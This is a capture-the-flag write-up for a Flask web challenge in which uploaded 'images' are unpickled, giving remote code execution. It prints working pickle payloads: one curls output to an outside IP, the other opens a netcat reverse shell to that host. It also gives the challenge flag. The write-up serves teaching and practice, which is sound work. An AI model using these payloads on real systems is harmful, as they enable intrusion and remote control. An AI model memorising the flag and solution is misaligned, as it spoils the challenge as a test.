# Imported Kimchi 2
## Details
- Category: Web
- Flag: `flag{4nd_h3r3_1_w45_th1nk1ng_v1n3g4r_w45_s4n1t4ry}`
- Synopsis:
	- The server's source code is available, Flask being the web framework.
	- Gain RCE via Insecure Deserialization by including manipulated serialized objects to uploaded files.
## Writeup
Upon visiting the index page of [https://imported-kimchi-2.cha.hackpack.club/](https://imported-kimchi-2.cha.hackpack.club/), a file upload is available for PNG and JPG/JPEG images, which may be viewed after uploading with a manipulated file name, being a UUID.

![image](https://raw.githubusercontent.com/greysonevans/HackPackCTF_2022_Writeups/main/images/Pasted%20image%2020220410231334.png)

![image](https://raw.githubusercontent.com/greysonevans/HackPackCTF_2022_Writeups/main/images/Pasted%20image%2020220410231418.png)

![image](https://raw.githubusercontent.com/greysonevans/HackPackCTF_2022_Writeups/main/images/Pasted%20image%2020220410231441.png)

Inspecting the provided source code, the webserver attempts to deserialize the uploaded image file, which may be exploited to gain RCE. For standard image files, this would not be feasible; however, an attacker may craft malicious payloads and upload them as image files to gain code execution.

![image](https://raw.githubusercontent.com/greysonevans/HackPackCTF_2022_Writeups/main/images/Pasted%20image%2020220410231752.png)

From viewing https://book.hacktricks.xyz/pentesting-web/deserialization#pickle, I found a payload that may be used to gain RCE on the affected service.

To successfully gain RCE on the service, I created a VPS via AWS Lightsail and opened TCP port 80 using a netcat listener.

The python script below includes the Proof of Concept used to test whether RCE exists. The script checks whether netcat exists on the affected service, then sends HTTP POST data back to the VPS.

```python
#!/usr/bin/env python3

import pickle
import base64

class Payload(object):
	def __reduce__(self):
		import os
		return (os.system,('curl 3.135.195.57 -X POST -d $(which nc | base64)',))

poc = Payload()
print(poc)
print(pickle.dumps(poc))
```

![image](https://raw.githubusercontent.com/greysonevans/HackPackCTF_2022_Writeups/main/images/Pasted%20image%2020220410232537.png)

Then, by uploading and visiting the respective file, I received a connection back on my VPS!

![image](https://raw.githubusercontent.com/greysonevans/HackPackCTF_2022_Writeups/main/images/Pasted%20image%2020220410232801.png)

To gain a fully functional shell, I used Pentest Monkey's reverse shell cheat sheet to grab the flag!

The final payload to generate is:

```python
#!/usr/bin/env python3

import pickle
import base64

class Payload(object):
	def __reduce__(self):
		import os
		return (os.system,('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 3.135.195.57 80 >/tmp/f',))

poc = Payload()
print(pickle.dumps(poc))
```

From uploading and attempting to view the image on the webpage, I received a reverse shell on my VPS to grab the flag!

![image](https://raw.githubusercontent.com/greysonevans/HackPackCTF_2022_Writeups/main/images/Pasted%20image%2020220410233224.png)

![image](https://raw.githubusercontent.com/greysonevans/HackPackCTF_2022_Writeups/main/images/Pasted%20image%2020220410233331.png)
